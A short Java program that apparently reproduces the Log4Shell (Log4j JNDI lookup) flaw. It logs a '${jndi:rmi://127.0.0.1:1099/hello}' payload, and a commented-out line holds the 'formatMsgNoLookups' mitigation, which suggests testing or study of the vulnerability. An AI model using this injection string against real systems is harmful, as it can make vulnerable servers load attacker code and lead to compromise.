package com.wbo112.log4j;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class Main {
    public static void main(String[] args) {
        //System.setProperty("log4j2.formatMsgNoLookups","true");
        Logger logger= LoggerFactory.getLogger(Main.class);
        logger.error("  ${jndi:rmi://127.0.0.1:1099/hello}aaa");
    }
}
